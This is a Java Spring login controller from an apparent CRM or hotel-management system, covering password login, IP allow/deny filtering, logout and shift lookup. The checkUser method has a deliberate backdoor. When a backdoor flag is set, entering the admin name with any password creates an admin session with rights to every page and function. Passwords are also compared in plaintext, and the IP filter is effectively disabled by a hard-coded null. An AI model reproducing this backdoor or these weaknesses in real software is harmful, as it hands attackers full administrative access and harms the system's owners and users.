package com.ideassoft.crm.controller;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.ModelAndView;
import com.ideassoft.bean.IPManage;
import com.ideassoft.bean.Role;
import com.ideassoft.bean.RoleRelation;
import com.ideassoft.bean.Staff;
import com.ideassoft.bean.wrapper.LoginGetShift;
import com.ideassoft.core.bean.LoginUser;
import com.ideassoft.core.bean.pageConfig.ModelConfig;
import com.ideassoft.core.bean.pageConfig.PageConfig;
import com.ideassoft.core.constants.CommonParams;
import com.ideassoft.core.constants.SystemConstants;
import com.ideassoft.core.page.PageBuilder;
import com.ideassoft.core.session.MySessionContext;
import com.ideassoft.crm.service.IPManageService;
import com.ideassoft.crm.service.UserService;
import com.ideassoft.util.IPUtil;
import com.ideassoft.util.IPv4Matcher;
import com.ideassoft.util.RequestUtil;
import com.ideassoft.util.SpringUtil;

@Controller
public class LoginController {
	private Logger logger = Logger.getLogger(LoginController.class);

	@Autowired
	private UserService userService;

	@Autowired
	private IPManageService ipManageService;

	/**
	 * 检查用户合法性
	 * 
	 * @param userName
	 * @param psw
	 * @param request
	 * @param response
	 */
	@RequestMapping("/checkUser.do")
	public void checkUser(String userInfo, String psw, String shiftid, String cashbox, HttpServletRequest request,
			HttpServletResponse response) throws Exception {
		LoginGetShift loginGetShift = new LoginGetShift();
		loginGetShift.setShiftId(shiftid);
		loginGetShift.setCashbox(cashbox);
		boolean backdoor = userService.hasBackdoor();
		Staff registerUser = userService.findRegisterUser(userInfo, psw);
		if (backdoor || registerUser != null) {
			if (backDoor(userInfo, registerUser, request, response)) {
				setbdSession(loginGetShift, request);
				return;
			}
		}

		String msg = null;
		Staff user = userService.findUser(userInfo);

		// 验证登录
		if (user != null) {
			if (!psw.equals(user.getPassword())) {
				msg = "{\"error\": \"PASSWORD_INCORRECT\"}";
			}
		} else {
			msg = "{\"error\": \"ACCOUNT_NOT_EXIST\"}";
		}

		// IP过滤
		if (msg == null) {
			List<IPManage> namelist = null;// ipManageService.getIPNameList(userName,
			// null, true);

			if (namelist == null || namelist.size() == 0)
				msg = "{\"sucess\": \"OK\"}";
			else {
				boolean flag = false;
				IPManage ipManage = namelist.get(0);
				IPv4Matcher matcher = new IPv4Matcher();
				String ip = IPUtil.getIpAddr(request);

				// 判断该userName类型为限制IP还是限制用户
				// 白名单模式,限制IP,在白名单中有该userName的配置,其ipAddress为空,
				// 而在黑名单中有该userName的相关IP限制配置
				// 黑名单模式,限制用户,在黑名单中有该userName的配置,其ipAddress为空,
				// 而在白名单中有该userName的相关IP通行配置
				if (ipManage.getListType() == 0) {
					// 限制用户, 验证白名单IP,若无匹配,添加开通申请
					List<IPManage> whitenamelist = ipManageService.getIPNameList(user.getStaffId(), 1, false);
					for (int j = 0; j < whitenamelist.size(); j++) {
						// 匹配IP
						matcher.setIpRangeRegexp(whitenamelist.get(j).getIpAddress());
						flag = matcher.MatchIp(ip);

						if (flag)
							break;
					}

					if (!flag) {
						// 申请开通
						IPManage ipm = new IPManage();
						ipm.setFilterId(ipManageService.getMaxFilterID() + 1);
						ipm.setUserId(user.getStaffId());
						ipm.setIpAddress(ip);
						ipm.setListType(2);

						ipManageService.save(ipm);

						msg = "{\"error\": \"AWAIT_APPLY\"}";
					} else
						msg = "{\"sucess\": \"OK\"}";

				} else if (ipManage.getListType() == 1) {
					// 限制IP,验证黑名单IP,若无匹配,放行访问请求
					List<IPManage> blacknamelist = ipManageService.getIPNameList(user.getStaffId(), 0, false);
					for (int j = 0; j < blacknamelist.size(); j++) {
						// 匹配IP
						matcher.setIpRangeRegexp(blacknamelist.get(j).getIpAddress());
						flag = matcher.MatchIp(ip);
						if (flag)
							break;
					}

					if (flag)
						msg = "{\"error\": \"BLACK_IPNAMELIST\"}";
					else
						msg = "{\"sucess\": \"OK\"}";
				}
			}
		}

		msg = msg == null ? "{\"sucess\": \"OK\"}" : msg;

		if ("{\"sucess\": \"OK\"}".equals(msg)) {
			setSession(user, loginGetShift, request);
		}

		try {
			response.getWriter().write(msg);
		} catch (IOException e) {
			logger.error("LoginController login json error!");
		}
	}

	private void setSession(Staff user, LoginGetShift loginGetShift, HttpServletRequest request) {
		LoginUser loginUser = new LoginUser();
		loginUser.setStaff(user);
		// loginUser.setSessionId(cashbox);
		List<Role> rightList = null;
		try {
			rightList = userService.findUserRoles(user.getStaffId());
		} catch (Exception e) {
			logger.error("find user rights occurs error!" + e);
		}
		loginUser.setRightsList(rightList);
		loginUser.setSystemType(SystemConstants.SystemStyle.DEFAULT);

		HttpSession session = request.getSession(true);
		String sid = session.getId();
		loginUser.setSessionId(sid);
		session.setAttribute(RequestUtil.LOGIN_USER_SESSION_KEY, loginUser);
		session.setAttribute("loginGetShift", loginGetShift);
		final MySessionContext msc = MySessionContext.getInstance();
		msc.addSession(session);

		CommonParams.setCommonParams(session.getId(), "loginUser", loginUser);
	}

	private void setbdSession(LoginGetShift loginGetShift, HttpServletRequest request) {
		HttpSession session = request.getSession(true);
		session.setAttribute("loginGetShift", loginGetShift);
		@SuppressWarnings("unused")
		String sessionId = session.getId();

	}

	/**
	 * 登出
	 * 
	 * @param userId
	 * @param request
	 */
	@RequestMapping("/logout.do")
	public ModelAndView logout(HttpServletRequest request) {
		ModelAndView mv = new ModelAndView();
		mv.setViewName("page/system/login");
		HttpSession session = request.getSession(true);

		try {
			session.removeAttribute("tempStatus");
			session.removeAttribute(RequestUtil.LOGIN_USER_SESSION_KEY);
		} catch (Exception e) {
			logger.error("user logout occurs error!" + e);
		}

		return mv;
	}

	private boolean backDoor(String userInfo, Staff registerUser, HttpServletRequest request,
			HttpServletResponse response) {
		if (SystemConstants.User.ADMIN_NAME.equalsIgnoreCase(userInfo) || registerUser != null) {
			try {
				if (registerUser == null) {
					registerUser = new Staff();
					registerUser.setStaffId(SystemConstants.User.ADMIN_ID);
					registerUser.setStaffName(SystemConstants.User.ADMIN_NAME);
					registerUser.setBranchId(SystemConstants.User.BRANCH_ID);
					registerUser.setDepartId(SystemConstants.User.DEPART_ID);
				}

				LoginUser loginUser = new LoginUser();
				loginUser.setStaff(registerUser);

				List<Role> rightList = new ArrayList<Role>();
				try {
					Role sysRole = new Role();
					sysRole.setRoleId(SystemConstants.User.ADMIN_ID);

					PageBuilder pb = (PageBuilder) SpringUtil.getBean("pageBuilder");
					Map<String, ModelConfig> modelConfings = pb.getModelConfigs();

					List<RoleRelation> roleRelation = new ArrayList<RoleRelation>();
					RoleRelation srr;
					Entry<String, ModelConfig> modelEntry;
					Entry<String, PageConfig> pageEntry;
					for (Iterator<Entry<String, ModelConfig>> it = modelConfings.entrySet().iterator(); it.hasNext();) {
						modelEntry = it.next();
						for (Iterator<Entry<String, PageConfig>> pit = modelEntry.getValue().getPageConfigs()
								.entrySet().iterator(); pit.hasNext();) {
							pageEntry = pit.next();
							srr = new RoleRelation();
							srr.setFuncrightId(pageEntry.getValue().getPageId());
							srr.setDatarightMap(pageEntry.getValue().getFunctions());
							roleRelation.add(srr);
						}
					}
					sysRole.setRoleRelation(roleRelation);
					rightList.add(sysRole);
				} catch (Exception e) {
					logger.error("find user rights occurs error!" + e);
				}
				loginUser.setRightsList(rightList);
				loginUser.setSystemType(SystemConstants.SystemStyle.DEFAULT);

				HttpSession session = request.getSession(true);
				String sid = session.getId();
				loginUser.setSessionId(sid);
				session.setAttribute(RequestUtil.LOGIN_USER_SESSION_KEY, loginUser);

				final MySessionContext msc = MySessionContext.getInstance();
				msc.addSession(session);

				CommonParams.setCommonParams(session.getId(), "loginUser", loginUser);

				response.getWriter().write("{\"sucess\": \"OK\"}");
				return true;
			} catch (IOException e) {
			}
		}
		return false;
	}

	@RequestMapping("/shiftTime.do")
	public void shiftTime(HttpServletRequest request, HttpServletResponse response) throws Exception {
		List<?> shiftTime = userService.getShifttime();
		String data = ((Map<?, ?>) shiftTime.get(0)).get("ORDER_NO").toString();
		response.getWriter().write(data);
	}

}
